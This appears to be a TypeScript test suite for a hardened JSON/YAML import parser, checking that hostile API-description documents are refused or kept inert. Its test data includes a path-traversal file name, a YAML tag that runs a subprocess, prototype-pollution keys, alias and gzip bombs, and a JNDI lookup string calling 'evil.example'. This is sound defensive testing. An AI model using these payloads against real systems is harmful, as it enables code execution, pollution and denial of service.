import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { test } from "node:test";
import { gzipSync } from "node:zlib";
import {
  DEFAULT_PARSE_LIMITS,
  detectDocumentFormat,
  parseBoundedDocument,
  resolveParseLimits,
  sanitizeGraph,
} from "../../../src/server/connectors/import/index.js";
import {
  CANARY,
  assertNoCanary,
  encode,
  expectConnectorError,
  fixtureBytes,
  gzipBomb,
} from "./support.js";

/*
 * IMP-01. The parser is the import boundary: every hostile document in
 * tests/connectors/fixtures/import goes through the same entry point the
 * service uses, and every refusal is asserted by its sanitized detail code.
 */

test("format detection cannot activate a parser the media type did not name", async () => {
  const yamlBytes = await fixtureBytes("petstore-openapi-3.1.yaml");
  const jsonBytes = await fixtureBytes("petstore-openapi-3.0.json");

  assert.equal(
    parseBoundedDocument(yamlBytes, { mediaType: "application/yaml" }).format,
    "yaml",
  );
  assert.equal(
    parseBoundedDocument(jsonBytes, { mediaType: "application/json" }).format,
    "json",
  );
  // A JSON document is JSON under a YAML media type too (JSON is a YAML
  // subset), but the YAML reader is the one that ran: the declared type wins.
  assert.equal(
    parseBoundedDocument(jsonBytes, { mediaType: "application/yaml" }).format,
    "yaml",
  );
  // A YAML document declared as JSON is refused rather than re-sniffed.
  await expectConnectorError(
    () => parseBoundedDocument(yamlBytes, { mediaType: "application/json" }),
    "invalid-request",
    "json.syntax",
  );
  // Unknown media types are refused, never guessed at.
  for (const mediaType of [
    "application/xml",
    "text/html",
    "application/x-yaml-1.1",
    "application/javascript",
    "application/x-python-pickle",
  ])
    await expectConnectorError(
      () => parseBoundedDocument(jsonBytes, { mediaType }),
      "invalid-request",
      "document.media-type-unsupported",
    );

  // Generic types fall back to the extension, then to the first character.
  assert.equal(
    detectDocumentFormat({
      mediaType: "application/octet-stream",
      fileName: "api.yml",
      text: "{}",
    }),
    "yaml",
  );
  assert.equal(
    detectDocumentFormat({ mediaType: "", text: "  \n [1,2]" }),
    "json",
  );
  assert.equal(detectDocumentFormat({ mediaType: "", text: "a: 1" }), "yaml");
  assert.equal(
    detectDocumentFormat({
      mediaType: "application/vnd.oai.openapi+json",
      text: "{}",
    }),
    "json",
  );
});

test("file names are hints, never paths", async () => {
  const bytes = encode('{"openapi":"3.1.0"}');
  for (const fileName of [
    "../../etc/passwd",
    "dir/api.json",
    "a\\b.json",
    "api\u0000.json",
    "..",
    " api.json",
    "x".repeat(256),
  ])
    await expectConnectorError(
      () => parseBoundedDocument(bytes, { fileName }),
      "invalid-request",
      "document.file-name-invalid",
    );
  assert.equal(
    parseBoundedDocument(bytes, { fileName: "openapi.v2-final.json" }).format,
    "json",
  );
});

test("JSON duplicate keys are refused instead of silently collapsing", async () => {
  const bytes = await fixtureBytes("malicious-duplicate-keys.json");
  // JSON.parse alone keeps the attacker's last value and reports nothing.
  const naive = JSON.parse(new TextDecoder().decode(bytes)) as {
    servers: Array<{ url: string }>;
  };
  assert.equal(naive.servers[0]?.url, "https://evil.example");
  await expectConnectorError(
    () => parseBoundedDocument(bytes, { mediaType: "application/json" }),
    "invalid-request",
    "json.duplicate-key",
  );
  // Nested and escaped spellings of the same key are the same key.
  for (const text of [
    '{"a":{"b":1,"b":2}}',
    '{"a":1,"\\u0061":2}',
    '{"x":[{"k":1,"k":2}]}',
  ])
    await expectConnectorError(
      () =>
        parseBoundedDocument(encode(text), { mediaType: "application/json" }),
      "invalid-request",
      "json.duplicate-key",
    );
  // Distinct keys that merely look similar stay acceptable.
  assert.deepEqual(
    parseBoundedDocument(encode('{"a":1,"A":2,"\\u00e1":3}'), {
      mediaType: "application/json",
    }).value,
    { a: 1, A: 2, á: 3 },
  );
});

test("YAML duplicate keys, merge keys and multiple documents are refused", async () => {
  for (const [name, detail] of [
    ["malicious-duplicate-keys.yaml", "yaml.duplicate-key"],
    ["malicious-merge-key.yaml", "yaml.merge-key-unsupported"],
    ["malicious-multi-document.yaml", "yaml.multiple-documents"],
    ["malicious-yaml-1-1.yaml", "yaml.version-unsupported"],
  ] as const)
    await expectConnectorError(
      async () =>
        parseBoundedDocument(await fixtureBytes(name), {
          mediaType: "application/yaml",
        }),
      "invalid-request",
      detail,
    );
});

test("only YAML 1.2 core tags resolve; executable and binary tags are refused", async () => {
  for (const name of ["malicious-yaml-tags.yaml", "malicious-yaml-binary.yaml"])
    await expectConnectorError(
      async () =>
        parseBoundedDocument(await fixtureBytes(name), {
          mediaType: "application/yaml",
        }),
      "invalid-request",
      "yaml.tag-unsupported",
    );
  for (const text of [
    "a: !!timestamp 2001-12-14",
    "a: !!omap\n  - x: 1",
    "a: !!set\n  ? x",
    "a: !mylocal foo",
    "a: !<tag:example.com,2024:thing> foo",
    "a: !!python/object/apply:subprocess.check_output [['id']]",
  ])
    await expectConnectorError(
      () =>
        parseBoundedDocument(encode(text), { mediaType: "application/yaml" }),
      "invalid-request",
      "yaml.tag-unsupported",
    );
  // The core schema's own tags stay usable and keep their meaning.
  assert.deepEqual(
    parseBoundedDocument(
      encode(
        'a: !!str 123\nb: !!int "5"\nc: !!bool true\nd: !!null ""\ne: !!seq [1]\n',
      ),
      { mediaType: "application/yaml" },
    ).value,
    { a: "123", b: 5, c: true, d: null, e: [1] },
  );
});

test("prototype-polluting keys are refused in both formats and nothing is mutated", async () => {
  for (const name of ["malicious-proto-key.json", "malicious-proto-key.yaml"])
    await expectConnectorError(
      async () => parseBoundedDocument(await fixtureBytes(name)),
      "invalid-request",
      "document.reserved-key",
    );
  for (const text of [
    '{"__proto__":{"polluted":true}}',
    '{"a":{"constructor":{"prototype":{"x":1}}}}',
    '{"\\u005f\\u005fproto\\u005f\\u005f":1}',
    '[{"prototype":1}]',
  ])
    await expectConnectorError(
      () =>
        parseBoundedDocument(encode(text), { mediaType: "application/json" }),
      "invalid-request",
      "document.reserved-key",
    );
  const probe = {} as { polluted?: unknown };
  assert.equal(probe.polluted, undefined);
  assert.equal(
    Object.prototype.hasOwnProperty.call(Object.prototype, "polluted"),
    false,
  );

  // A parsed object is a plain own-property graph: the parser's own objects
  // never reach the caller, so a later mutation cannot travel through them.
  const parsed = parseBoundedDocument(encode('{"a":{"b":[1,2]}}'), {
    mediaType: "application/json",
  }).value as Record<string, unknown>;
  assert.equal(Object.getPrototypeOf(parsed), Object.prototype);
  assert.deepEqual(Object.keys(parsed), ["a"]);
});

test("alias amplification is refused before expansion, and cycles are refused", async () => {
  const bomb = await fixtureBytes("malicious-billion-laughs.yaml");
  const started = Date.now();
  await expectConnectorError(
    () => parseBoundedDocument(bomb, { mediaType: "application/yaml" }),
    "invalid-request",
    "yaml.alias-expansion-exceeds-bounds",
  );
  // The refusal is structural, not a timeout: it costs a walk of the document.
  assert.ok(Date.now() - started < 2_000);

  await expectConnectorError(
    async () =>
      parseBoundedDocument(
        await fixtureBytes("malicious-circular-alias.yaml"),
        {
          mediaType: "application/yaml",
        },
      ),
    "invalid-request",
    "yaml.circular-alias",
  );
  await expectConnectorError(
    () =>
      parseBoundedDocument(encode("a: *missing\n"), {
        mediaType: "application/yaml",
      }),
    "invalid-request",
    "yaml.unresolved-alias",
  );
  await expectConnectorError(
    () =>
      parseBoundedDocument(
        encode(`a: &a x\n${"b: *a\n".repeat(6).replace(/b:/g, "b:")}`),
        { mediaType: "application/yaml", limits: { maxAliases: 2 } },
      ),
    "invalid-request",
    // Repeated `b` keys are caught first; alias counting is asserted below.
    "yaml.duplicate-key",
  );
  const aliases = encode(
    `base: &base {x: 1}\nlist: [${Array.from({ length: 6 }, () => "*base").join(", ")}]\n`,
  );
  await expectConnectorError(
    () =>
      parseBoundedDocument(aliases, {
        mediaType: "application/yaml",
        limits: { maxAliases: 4 },
      }),
    "invalid-request",
    "yaml.too-many-aliases",
  );
  // Modest, honest alias use still imports, and each use becomes its own value.
  const ok = parseBoundedDocument(aliases, { mediaType: "application/yaml" });
  const list = (ok.value as { list: Array<{ x: number }> }).list;
  assert.equal(ok.stats.aliases, 6);
  assert.equal(ok.stats.anchors, 1);
  assert.equal(list.length, 6);
  assert.notEqual(list[0], list[1]);
  list[0]!.x = 99;
  assert.equal(list[1]!.x, 1);
});

test("structural bounds hold for depth, node count, keys and string length", async () => {
  const deep = `${"[".repeat(200)}1${"]".repeat(200)}`;
  await expectConnectorError(
    () => parseBoundedDocument(encode(deep), { mediaType: "application/json" }),
    "invalid-request",
    "document.too-deep",
  );
  await expectConnectorError(
    () =>
      parseBoundedDocument(encode(`${"[".repeat(20)}1${"]".repeat(20)}`), {
        mediaType: "application/json",
        limits: { maxDepth: 8 },
      }),
    "invalid-request",
    "document.too-deep",
  );
  await expectConnectorError(
    () =>
      parseBoundedDocument(
        encode(`[${Array.from({ length: 50 }, (_, i) => i).join(",")}]`),
        {
          mediaType: "application/json",
          limits: { maxNodes: 10 },
        },
      ),
    "invalid-request",
    "document.too-many-nodes",
  );
  const manyKeys = `{${Array.from({ length: 40 }, (_, i) => `"k${i}":1`).join(",")}}`;
  await expectConnectorError(
    () =>
      parseBoundedDocument(encode(manyKeys), {
        mediaType: "application/json",
        limits: { maxKeysPerObject: 10 },
      }),
    "invalid-request",
    "document.too-many-keys",
  );
  await expectConnectorError(
    () =>
      parseBoundedDocument(encode(`{"a":"${"x".repeat(200)}"}`), {
        mediaType: "application/json",
        limits: { maxStringLength: 32 },
      }),
    "invalid-request",
    "document.string-too-long",
  );
  await expectConnectorError(
    () =>
      parseBoundedDocument(encode(`{"${"k".repeat(200)}":1}`), {
        mediaType: "application/json",
        limits: { maxKeyLength: 32 },
      }),
    "invalid-request",
    "document.key-too-long",
  );
  // YAML is held to the same bounds by the same numbers.
  await expectConnectorError(
    () =>
      parseBoundedDocument(
        encode(`a:\n${"  ".repeat(1)}b:\n    c:\n      d: 1\n`),
        {
          mediaType: "application/yaml",
          limits: { maxDepth: 2 },
        },
      ),
    "invalid-request",
    "document.too-deep",
  );
  await expectConnectorError(
    () =>
      parseBoundedDocument(encode(`key: "${"x".repeat(100)}"\n`), {
        mediaType: "application/yaml",
        limits: { maxStringLength: 10 },
      }),
    "invalid-request",
    "document.string-too-long",
  );
});

test("byte ceilings and empty input are refused before parsing", async () => {
  await expectConnectorError(
    () => parseBoundedDocument(new Uint8Array(0)),
    "invalid-request",
    "document.empty",
  );
  await expectConnectorError(
    () =>
      parseBoundedDocument(encode('{"a":1}'), {
        mediaType: "application/json",
        limits: { maxBytes: 4 },
      }),
    "invalid-request",
    "document.too-large",
  );
  assert.equal(DEFAULT_PARSE_LIMITS.maxBytes, 4 * 1024 * 1024);
  assert.equal(DEFAULT_PARSE_LIMITS.allowCompressed, false);
  // A limit that is absent, unbounded, fractional or beyond the ceiling is
  // refused: a caller cannot widen the policy by passing a bigger number.
  for (const limits of [
    { maxBytes: 0 },
    { maxBytes: -1 },
    { maxBytes: 1.5 },
    { maxBytes: Number.MAX_SAFE_INTEGER },
    { maxDepth: 100_000 },
    { maxNodes: Number.POSITIVE_INFINITY },
  ])
    await expectConnectorError(
      () => resolveParseLimits(limits as never),
      "invalid-request",
      "document.limits-invalid",
    );
});

test("compressed bodies are refused by default and bounded by decoded size when allowed", async () => {
  const gzipped = new Uint8Array(gzipSync(Buffer.from('{"openapi":"3.1.0"}')));
  await expectConnectorError(
    () => parseBoundedDocument(gzipped, { mediaType: "application/json" }),
    "invalid-request",
    "document.compressed-refused",
  );
  await expectConnectorError(
    () =>
      parseBoundedDocument(gzipped, {
        mediaType: "application/json",
        contentEncoding: "gzip",
      }),
    "invalid-request",
    "document.compressed-refused",
  );
  // A 16 MiB expansion from a few kilobytes: the decoded ceiling stops it, and
  // the cost is the ceiling rather than the expansion.
  const bomb = gzipBomb(16 * 1024 * 1024);
  assert.ok(bomb.byteLength < 64 * 1024);
  const started = Date.now();
  await expectConnectorError(
    () =>
      parseBoundedDocument(bomb, {
        mediaType: "application/json",
        contentEncoding: "gzip",
        limits: { allowCompressed: true, maxBytes: 64 * 1024 },
      }),
    "invalid-request",
    "document.decoded-too-large",
  );
  assert.ok(Date.now() - started < 5_000);
  // Decoded bytes are what gets parsed, digested and counted.
  const allowed = parseBoundedDocument(gzipped, {
    mediaType: "application/json",
    contentEncoding: "gzip",
    limits: { allowCompressed: true },
  });
  assert.deepEqual(allowed.value, { openapi: "3.1.0" });
  assert.equal(allowed.encoding, "gzip");
  assert.equal(allowed.byteLength, 19);
  assert.equal(
    allowed.digest,
    createHash("sha256").update('{"openapi":"3.1.0"}').digest("hex"),
  );
  await expectConnectorError(
    () =>
      parseBoundedDocument(gzipped, {
        mediaType: "application/json",
        contentEncoding: "exi",
      }),
    "invalid-request",
    "document.encoding-unsupported",
  );
});

test("text is UTF-8 without control characters, and the digest covers the exact bytes", async () => {
  await expectConnectorError(
    () => parseBoundedDocument(new Uint8Array([0xff, 0xfe, 0x7b, 0x00])),
    "invalid-request",
    "document.encoding-unsupported",
  );
  await expectConnectorError(
    () => parseBoundedDocument(new Uint8Array([0x7b, 0xc3, 0x28, 0x7d])),
    "invalid-request",
    "document.invalid-utf8",
  );
  await expectConnectorError(
    () =>
      parseBoundedDocument(encode('{"a":"x\u0007y"}'), {
        mediaType: "application/json",
      }),
    "invalid-request",
    "document.control-characters",
  );
  const withBom = new Uint8Array([0xef, 0xbb, 0xbf, ...encode('{"a":1}')]);
  const parsed = parseBoundedDocument(withBom, {
    mediaType: "application/json",
  });
  assert.deepEqual(parsed.value, { a: 1 });
  // The digest is of the bytes as captured, byte-order mark included.
  assert.equal(
    parsed.digest,
    createHash("sha256").update(Buffer.from(withBom)).digest("hex"),
  );
  assert.equal(parsed.byteLength, withBom.byteLength);
});

test("the parse-time bound is enforced", async () => {
  let clock = 0;
  await expectConnectorError(
    () =>
      parseBoundedDocument(encode('{"a":1}'), {
        mediaType: "application/json",
        now: () => (clock += 10_000),
      }),
    "invalid-request",
    "document.parse-timeout",
  );
});

test("a rebuilt graph refuses foreign prototypes, cycles and non-JSON values", async () => {
  await expectConnectorError(
    () =>
      sanitizeGraph(Object.assign(Object.create({ inherited: 1 }), { a: 1 })),
    "invalid-request",
    "document.prototype-tampered",
  );
  const cycle: Record<string, unknown> = {};
  cycle.self = cycle;
  await expectConnectorError(
    () => sanitizeGraph(cycle),
    "invalid-request",
    "document.circular-structure",
  );
  await expectConnectorError(
    () => sanitizeGraph({ a: Number.POSITIVE_INFINITY }),
    "invalid-request",
    "document.non-finite-number",
  );
  await expectConnectorError(
    () => sanitizeGraph({ a: () => 1 }),
    "invalid-request",
    "document.unsupported-value",
  );
  const nullProto = Object.create(null) as Record<string, unknown>;
  nullProto.a = 1;
  const clean = sanitizeGraph(nullProto).value as Record<string, unknown>;
  assert.equal(Object.getPrototypeOf(clean), Object.prototype);
  assert.deepEqual(clean, { a: 1 });
});

test("parse failures never echo document content", async () => {
  const bytes = await fixtureBytes("canary-invalid.json");
  assert.ok(new TextDecoder().decode(bytes).includes(CANARY));
  const error = await expectConnectorError(
    () => parseBoundedDocument(bytes, { mediaType: "application/json" }),
    "invalid-request",
    "json.syntax",
  );
  assertNoCanary(error, error.message, error.detail);
  // The same discipline for a YAML parser message, which quotes the line.
  const yamlError = await expectConnectorError(
    () =>
      parseBoundedDocument(encode(`a: "${CANARY}\nb: [unclosed\n`), {
        mediaType: "application/yaml",
      }),
    "invalid-request",
  );
  assertNoCanary(yamlError);
});

test("benign fixtures import with the shape their format promises", async () => {
  const petstore = parseBoundedDocument(
    await fixtureBytes("petstore-openapi-3.1.yaml"),
    { mediaType: "application/yaml" },
  );
  const value = petstore.value as {
    openapi: string;
    paths: Record<string, unknown>;
    components: { schemas: Record<string, unknown> };
  };
  assert.equal(value.openapi, "3.1.0");
  assert.deepEqual(Object.keys(value.paths), ["/pets", "/pets/{petId}"]);
  assert.ok(petstore.stats.nodes > 50);
  assert.ok(petstore.stats.depth > 3);

  for (const [name, mediaType] of [
    ["petstore-openapi-3.0.json", "application/json"],
    ["swagger-2.json", "application/json"],
    ["asyncapi-3.yaml", "application/yaml"],
    ["mcp-server.json", "application/json"],
    ["recursive-schema.json", "application/json"],
    ["malicious-example-values.json", "application/json"],
  ] as const) {
    const parsed = parseBoundedDocument(await fixtureBytes(name), {
      mediaType,
    });
    assert.equal(typeof parsed.value, "object");
    assert.ok(parsed.byteLength > 0);
  }
});

test("hostile example values are inert data, not instructions", async () => {
  const parsed = parseBoundedDocument(
    await fixtureBytes("malicious-example-values.json"),
    { mediaType: "application/json" },
  );
  const example = (
    parsed.value as {
      paths: Record<
        string,
        {
          post: {
            requestBody: {
              content: Record<string, { example: Record<string, unknown> }>;
            };
          };
        }
      >;
    }
  ).paths["/render"]!.post.requestBody.content["application/json"]!.example;
  // Every payload survives as a string; none of it is resolved, expanded or run.
  assert.equal(typeof example.html, "string");
  assert.equal(example.template, "${jndi:ldap://evil.example/a}");
  assert.equal(example.protoText, "__proto__");
  assert.equal(
    Object.prototype.hasOwnProperty.call(Object.prototype, "polluted"),
    false,
  );
  assert.deepEqual(Object.keys(example).sort(), [
    "expression",
    "html",
    "link",
    "nested",
    "protoText",
    "shell",
    "template",
  ]);
});
